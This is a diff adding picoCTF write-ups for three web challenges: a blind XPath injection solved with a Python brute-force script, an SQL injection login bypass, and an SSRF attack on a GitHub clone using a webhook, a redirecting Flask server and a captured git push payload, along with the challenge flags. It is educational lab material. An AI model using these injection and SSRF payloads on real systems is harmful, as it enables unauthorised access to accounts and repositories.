@@ -600,9 +600,287 @@ The query `SELECT * FROM table WHERE name = "Jake"` has two objects one where th
 SELECT username, password FROM users WHERE username='a'||'dmin' AND password=''GLOB'*'
 ```
 
-The character limit is 25 but our password is just 7 characters long! Let's enter it into the login page
+The character limit is 35 but our password is just 7 characters long! Let's enter it into the login page
 
-![](../.gitbook/assets/image%20%2811%29.png)
+![](../.gitbook/assets/image%20%2816%29.png)
 
 **Flag:** picoCTF{0n3\_m0r3\_t1m3\_fc0f841ee8e0d3e1f479f1a01a617ebb}
+
+### X marks the spot
+
+**Description:** Another login you have to bypass. Maybe you can find an injection that works?
+
+**Points:** 250
+
+#### **Solution**
+
+The link takes you to a login screen that reads "Only I know the password, and I don't use any of those regular old unsafe query languages!" Let's look at the hint.
+
+{% hint style="info" %}
+**Hint 1:** XPATH
+{% endhint %}
+
+So, this is an XPath injection. This is not like any of the injections before. I tried by passing the login with always true queryies but they do not work, However, There is an interesting message that pops up when I enter an always true booleans like `' or 1=1 or 'a` 
+
+![](../.gitbook/assets/image%20%2814%29.png)
+
+It says "You're on the right path." I tried to change things a little bit and used a false query like `' and 1=2 and 'a'='a` 
+
+![](../.gitbook/assets/image%20%2817%29.png)
+
+Now it says "Login failure." This means that it's a Blind XPATH injecton which means we have to figure out the username and password using queries. Here we can use **"starts-wth\(\)"** operator. Which returns true if the passed charecters is in the beginnig of a document. We do not know the column names yet so we can use `//*` which basically mean check for all documents \(coulmns\). I tried testing it with `' or //*[starts-with(text(),'a')] or 'a'='b` which interestingly enough returned true. I tried again with `' or //*[starts-with(text(),'ab')] or 'a'='b` which returned false. 
+
+We can actualy write a script that runs through alll the combinations and stacks the succesfull charecters upon success. Here's the Python script that I made
+
+```python
+import requests
+from string import *
+
+charecters = ascii_lowercase + ascii_uppercase + digits+"}_"
+print(charecters)
+
+seen_password = ["picoCTF{"]
+while True:
+
+    for ch in charecters:
+        print(f"trying {''.join(seen_password)+ch}")
+        st = ''.join(seen_password)+ch
+        data = {"name":"admin", "pass":f"' or //*[starts-with(text(),'{st}')] or '1'='"}
+        r = requests.post("http://mercury.picoctf.net:59946/", data=data)
+
+        content = r.text
+        if "You&#39;re on the right path." in content:
+            seen_password.append(ch)
+            break
+```
+
+I tried running above script several times before which returned with values like admin, bob, thisisnottheflag then I figured that we are supposed to look for the flag itself not some password. so I started with the standard starting format `picoCTF{` after running for a while, I finaly got the full flag.
+
+**Flag:** picoCTF{h0p3fully\_u\_t0ok\_th3\_r1ght\_xp4th\_a56016ef}
+
+### Web Gauntlet 3
+
+**Description:** Last time, I promise! Only 25 characters this time. Log in as admin
+
+**Points:** 300
+
+#### **Solution**
+
+This is the same challenge as the "Web Gauntlet 2" but this time we are only allowed to use 25 characters for our injection. We can solve this using the exact same injection because last time our query was only 7 characters.
+
+**Username:** `a'||'dmin`  
+**Password:** `'GLOB'*` ****
+
+![](../.gitbook/assets/image%20%2818%29.png)
+
+**Flag:** picoCTF{k3ep\_1t\_sh0rt\_30593712914d76105748604617f4006a}
+
+### Bithug
+
+**Description:** Code management software is way too bloated. Try our new lightweight solution, BitHug.
+
+**Points:** 500
+
+#### **Solution**
+
+This is the last challenge of Web Exploit and also has the highest points in web. Here we are also given source code. 
+
+This is basically a clone of GitHub it has features like webhooks, collaborators etc.The flag is hidden at `_/<username>.git` but we do not have access to read it. So we need to figure out a way to gain read access to the repo.
+
+Let's go through the source code, Here's an interesting thing I found in `auth-api.ts` 
+
+```typescript
+    const sourceIp = req.socket.remoteAddress;
+    if (sourceIp === "127.0.0.1" || sourceIp === "::1" || sourceIp === "::ffff:127.0.0.1") {
+        req.user = { kind: "admin" };
+        return next();
+    }
+
+    req.user = { kind: "none" };
+    return next();
+```
+
+You notice that requests from localhost \(127.0.0.1\) are given admin access and all endpoints from `git-api.ts` can be freely accessed by admins.
+
+The server has a webhook feature which we can use to send a request from the server to server itself \(SSRF\). But this way we can;t really read any data because there is no way to echo the data back from the endpoit that was accessed by web-hook.
+
+How ever there is one thing we could do here, We can add ourselves as a collaboraor to `_/<username>.git` since admin has rights to all the endpoits we can send a request to git upload endpoint `/:user/:repo.git/git-upload-pack` which is responsible for updating the repo on git.
+
+**The Plan**
+
+1. Create a payload for adding collaborator to a repository
+2. Create a webhook that sends post reuqest to `_127.0.0.1:1823/<username>.git/git-upload-pack` 
+3. Use this payload to push to `_/<username>.git` using webhook
+
+Notice, we need to send this to that 1823 port because that's where the server is actually running locally. You can find this from the Dockerfile provided.
+
+**Step 1**
+
+Let us creat an user with username: "abbas" and password: "abbas" on bithug. Now, create a repository names "abbas". We will clone local this repository using 
+
+```bash
+git clone http://abbas@venus.picoctf.net:49771/abbas/abbas.git
+```
+
+Now, we'll need to add a collaborator, we can find instructions on the repository on bithug
+
+![](../.gitbook/assets/image%20%2819%29.png)
+
+Let us add a collaborator using
+
+```bash
+$ git checkout --orphan newbranch
+$ echo "abbas" > access.conf
+$ git add access.conf
+$ git commit -m "Added a user to the repo"
+```
+
+Do not push it yet, we need to capture this request. I am going to use [Wireshark ](https://www.wireshark.org/)for this. After starting "capture" on wireshark, `git push origin @:refs/meta/config`  
+
+
+![](../.gitbook/assets/image%20%2812%29.png)
+
+Here is the `http` stream from wireshark, You'll notice that there is a `POST` request. That's what we need.
+
+![](../.gitbook/assets/image%20%2815%29.png)
+
+Highlighted is that data we need, Let us copy it in the Hex string format which should look like this
+
+```text
+"\x30\x30\x39\x34\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x20\x61\x32\x31\x32\x39\x39\x38\x61\x35\x65\x63\x32\x36\x37\x31\x35\x37\x61\x33\x39\x62\x64\x62\x37\x39\x30\x64\x33\x30\x33\x30\x39\x34\x38\x32\x65\x35\x31\x34\x32\x20\x72\x65\x66\x73\x2f\x6d\x65\x74\x61\x2f\x63\x6f\x6e\x66\x69\x67\x00\x20\x72\x65\x70\x6f\x72\x74\x2d\x73\x74\x61\x74\x75\x73\x20\x73\x69\x64\x65\x2d\x62\x61\x6e\x64\x2d\x36\x34\x6b\x20\x61\x67\x65\x6e\x74\x3d\x67\x69\x74\x2f\x32\x2e\x32\x35\x2e\x31\x30\x30\x30\x30\x50\x41\x43\x4b\x00\x00\x00\x02\x00\x00\x00\x03\x9b\x0c\x78\x9c\xa5\xcc\x41\x0a\xc2\x30\x10\x40\xd1\x7d\x4e\x31\x7b\x51\x32\x93\xc6\xb6\x20\xa2\xa8\x0b\x2d\xa8\xa0\x17\x48\x9b\x29\x2d\xb4\x8e\xc4\xe9\xfd\xad\x67\x70\xf3\x17\x7f\xf1\x34\x31\x03\x65\x8e\x1a\xcc\x0b\x8a\x31\xf7\x59\x41\xd4\xd6\xe4\x83\x2d\x33\xf2\x6d\x64\x6c\x69\x7e\xd6\xd5\xa5\x09\x93\x76\x92\x20\x89\x28\x6c\x7e\xdd\x1d\x4f\x8f\xea\x79\xbb\x2f\xaf\x87\x73\x75\x41\xb7\x1a\xa4\x09\x43\x94\x31\xf4\xaf\x2d\xe0\x1a\xf3\xd2\x7a\x24\x84\x85\xf5\xce\x9a\x46\xc6\xb1\x57\xe5\x3f\x08\xb3\x8f\x91\x23\x04\x98\x3e\x33\xa3\x02\xda\x31\x24\x7e\x8b\xf9\x02\xc2\xda\x3c\x04\xa7\x02\x78\x9c\x33\x34\x30\x30\x33\x31\x51\x48\x4c\x4e\x4e\x2d\x2e\xd6\x4b\xce\xcf\x4b\x63\xf8\x1c\x5b\xcb\xe7\xce\xf0\xfb\x6d\x65\xac\xeb\xc3\x59\x2b\x97\x33\x3e\x33\xf3\xb8\x0f\x00\x0b\xd6\x0f\xca\x36\x78\x9c\x4b\x4c\x4a\x4a\x2c\xe6\x02\x00\x07\xd1\x02\x04\x30\x9a\x4e\xdf\x99\x0e\xe6\x14\xcf\xdf\xbf\x9f\x2b\x17\xad\x88\x60\x16\x21\x12"
+```
+
+Now we need to get this to the webhook body, If you look at this part of the source code:
+
+```typescript
+router.get("/:user/:repo.git/webhooks", async (req, res) => {
+    if (req.user.kind === "admin" || req.user.kind === "none") {
+        return res.send({ webhooks: [] });
+    }
+    const webhooks = await webhookManager.getWebhooksForUser(req.git.repo, req.user.user);
+    return res.send(webhooks.map(
+        (webhook): SerializedWebhook => ({ ...webhook, body: webhook.body.toString("base64") }))
+    );
+});
+```
+
+You'll notice that the body of the webhook is encoded in base64. So let's do that using simple python script.
+
+```python
+import base64
+
+hex_string = b"\x30\x30\x39\x34\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x20\x61\x32\x31\x32\x39\x39\x38\x61\x35\x65\x63\x32\x36\x37\x31\x35\x37\x61\x33\x39\x62\x64\x62\x37\x39\x30\x64\x33\x30\x33\x30\x39\x34\x38\x32\x65\x35\x31\x34\x32\x20\x72\x65\x66\x73\x2f\x6d\x65\x74\x61\x2f\x63\x6f\x6e\x66\x69\x67\x00\x20\x72\x65\x70\x6f\x72\x74\x2d\x73\x74\x61\x74\x75\x73\x20\x73\x69\x64\x65\x2d\x62\x61\x6e\x64\x2d\x36\x34\x6b\x20\x61\x67\x65\x6e\x74\x3d\x67\x69\x74\x2f\x32\x2e\x32\x35\x2e\x31\x30\x30\x30\x30\x50\x41\x43\x4b\x00\x00\x00\x02\x00\x00\x00\x03\x9b\x0c\x78\x9c\xa5\xcc\x41\x0a\xc2\x30\x10\x40\xd1\x7d\x4e\x31\x7b\x51\x32\x93\xc6\xb6\x20\xa2\xa8\x0b\x2d\xa8\xa0\x17\x48\x9b\x29\x2d\xb4\x8e\xc4\xe9\xfd\xad\x67\x70\xf3\x17\x7f\xf1\x34\x31\x03\x65\x8e\x1a\xcc\x0b\x8a\x31\xf7\x59\x41\xd4\xd6\xe4\x83\x2d\x33\xf2\x6d\x64\x6c\x69\x7e\xd6\xd5\xa5\x09\x93\x76\x92\x20\x89\x28\x6c\x7e\xdd\x1d\x4f\x8f\xea\x79\xbb\x2f\xaf\x87\x73\x75\x41\xb7\x1a\xa4\x09\x43\x94\x31\xf4\xaf\x2d\xe0\x1a\xf3\xd2\x7a\x24\x84\x85\xf5\xce\x9a\x46\xc6\xb1\x57\xe5\x3f\x08\xb3\x8f\x91\x23\x04\x98\x3e\x33\xa3\x02\xda\x31\x24\x7e\x8b\xf9\x02\xc2\xda\x3c\x04\xa7\x02\x78\x9c\x33\x34\x30\x30\x33\x31\x51\x48\x4c\x4e\x4e\x2d\x2e\xd6\x4b\xce\xcf\x4b\x63\xf8\x1c\x5b\xcb\xe7\xce\xf0\xfb\x6d\x65\xac\xeb\xc3\x59\x2b\x97\x33\x3e\x33\xf3\xb8\x0f\x00\x0b\xd6\x0f\xca\x36\x78\x9c\x4b\x4c\x4a\x4a\x2c\xe6\x02\x00\x07\xd1\x02\x04\x30\x9a\x4e\xdf\x99\x0e\xe6\x14\xcf\xdf\xbf\x9f\x2b\x17\xad\x88\x60\x16\x21\x12"
+print(base64.encodebytes(hex_string))
+```
+
+This will give us the body of out webhook, it should look like this
+
+```text
+MDA5NDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgYTIxMjk5OGE1ZWMy\nNjcxNTdhMzliZGI3OTBkMzAzMDk0ODJlNTE0MiByZWZzL21ldGEvY29uZmlnACByZXBvcnQtc3Rh\ndHVzIHNpZGUtYmFuZC02NGsgYWdlbnQ9Z2l0LzIuMjUuMTAwMDBQQUNLAAAAAgAAAAObDHicpcxB\nCsIwEEDRfU4xe1Eyk8a2IKKoCy2ooBdImykttI7E6f2tZ3DzF3/xNDEDZY4azAuKMfdZQdTW5IMt\nM/JtZGxpftbVpQmTdpIgiShsft0dT4/qebsvr4dzdUG3GqQJQ5Qx9K8t4Brz0nokhIX1zppGxrFX\n5T8Is4+RIwSYPjOjAtoxJH6L+QLC2jwEpwJ4nDM0MDAzMVFITE5OLS7WS87PS2P4HFvL587w+21l\nrOvDWSuXMz4z87gPAAvWD8o2eJxLTEpKLOYCAAfRAgQwmk7fmQ7mFM/fv58rF62IYBYhEg==
+```
+
+**Step 2**
+
+Now we need to create a webhook, let us create a sample webhook first in our `abbas` repository and see what requests are made.
+
+```javascript
+{
+    "url": "http://google.com",
+    "body": "ewogICAgImJyYW5jaCI6ICJ7e2JyYW5jaH19IiwKICAgICJ1c2VyIjogInt7dXNlcn19Igp9",
+    "contentType": "application/json"
+}
+```
+
+This is the format we need to use for creating our webhook. We already have the body and the `contentType` is `application/x-git-receive-pack-request` which you can find on your wireshark request.
+
+The url is supposed to be `127.0.0.1:1823` but it's tricky due to this
+
+```typescript
+router.post("/:user/:repo.git/webhooks", async (req, res) => {
+    if (req.user.kind === "admin" || req.user.kind === "none") {
+        return res.status(400).end();
+    }
+
+    const { url, body, contentType } = req.body;
+    const validationUrl = new URL(url);
+    if (validationUrl.port !== "" && validationUrl.port !== "80") {
+        throw new Error("Url must go to port 80");
+    }
+    if (validationUrl.host === "localhost" || validationUrl.host === "127.0.0.1") {
+        throw new Error("Url must not go to localhost");
+    }
+
+    if (typeof contentType !== "string" || typeof body !== "string") {
+        throw new Error("Bad arguments");
+    }
+    const trueBody = Buffer.from(body, "base64");
+
+    await webhookManager.addWebhook(req.git.repo, req.user.user, url, contentType, trueBody);
+    return res.send({});
+});
+```
+
+There are filters in place that prevent us from adding 127.0.0.1 as host and a port that's not 80. I solved this by hosting a flask app that redirects all the traffic to `http://127.0.0.1:1823/_/abbas.git/git-receive-pack` here is the code for that
+
+```python
+from flask import Flask, redirect
+
+application = app = Flask(__name__)
+
+
+@app.route('/', methods=["POST", "GET"])
+def index():
+    return redirect("http://127.0.0.1:1823/_/abbas.git/git-receive-pack", code=307)
+
+
+
+if __name__ == '__main__':
+    application.run(host='0.0.0.0', debug=True)
+```
+
+Note, it has to be a `307` redirect or else the incoming requests will be ignored.
+
+Let's prepare our payload for creating a webhook
+
+```javascript
+{
+    "url":"<flask_app_url>",
+    "body":"MDA5NDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgYTIxMjk5OGE1ZWMy\nNjcxNTdhMzliZGI3OTBkMzAzMDk0ODJlNTE0MiByZWZzL21ldGEvY29uZmlnACByZXBvcnQtc3Rh\ndHVzIHNpZGUtYmFuZC02NGsgYWdlbnQ9Z2l0LzIuMjUuMTAwMDBQQUNLAAAAAgAAAAObDHicpcxB\nCsIwEEDRfU4xe1Eyk8a2IKKoCy2ooBdImykttI7E6f2tZ3DzF3/xNDEDZY4azAuKMfdZQdTW5IMt\nM/JtZGxpftbVpQmTdpIgiShsft0dT4/qebsvr4dzdUG3GqQJQ5Qx9K8t4Brz0nokhIX1zppGxrFX\n5T8Is4+RIwSYPjOjAtoxJH6L+QLC2jwEpwJ4nDM0MDAzMVFITE5OLS7WS87PS2P4HFvL587w+21l\nrOvDWSuXMz4z87gPAAvWD8o2eJxLTEpKLOYCAAfRAgQwmk7fmQ7mFM/fv58rF62IYBYhEg==",
+    "contentType":"application/x-git-receive-pack-result"
+}
+```
+
+I am going to use curl so here's my request. Note that you'll need to grab the authentication cookie from your browers
+
+```bash
+curl -i -X POST -H "Content-Type: application/json" --cookie "user-token=81bb7700-be5a-44d4-8ab3-41de4d3d3748" -d '{"url":"<flask_app_url>","body":"MDA5NDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgYTIxMjk5OGE1ZWMy\nNjcxNTdhMzliZGI3OTBkMzAzMDk0ODJlNTE0MiByZWZzL21ldGEvY29uZmlnACByZXBvcnQtc3Rh\ndHVzIHNpZGUtYmFuZC02NGsgYWdlbnQ9Z2l0LzIuMjUuMTAwMDBQQUNLAAAAAgAAAAObDHicpcxB\nCsIwEEDRfU4xe1Eyk8a2IKKoCy2ooBdImykttI7E6f2tZ3DzF3/xNDEDZY4azAuKMfdZQdTW5IMt\nM/JtZGxpftbVpQmTdpIgiShsft0dT4/qebsvr4dzdUG3GqQJQ5Qx9K8t4Brz0nokhIX1zppGxrFX\n5T8Is4+RIwSYPjOjAtoxJH6L+QLC2jwEpwJ4nDM0MDAzMVFITE5OLS7WS87PS2P4HFvL587w+21l\nrOvDWSuXMz4z87gPAAvWD8o2eJxLTEpKLOYCAAfRAgQwmk7fmQ7mFM/fv58rF62IYBYhEg==","contentType":"application/x-git-receive-pack-result"}' http://venus.picoctf.net:49771/abbas/abbas.git/webhooks
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 2
+ETag: W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"
+Date: Thu, 08 Apr 2021 18:30:37 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+```
+
+Great, We are ready with out webhook
+
+**Step 3:**
+
+Now we just need to trigger our webhook by doing a git push to our `abbas/abbas` repository.
+
+```bash
+$ echo "Hi" > hi.txt
+$ git add .
+$ git commit -m "pwn"
+$ git push
+```
+
+Perfect! Now let us try to open `_/abbas` on Bithug.
+
+![](../.gitbook/assets/image%20%2813%29.png)
+
+**Flag:** picoCTF{good\_job\_at\_gitting\_good}
 
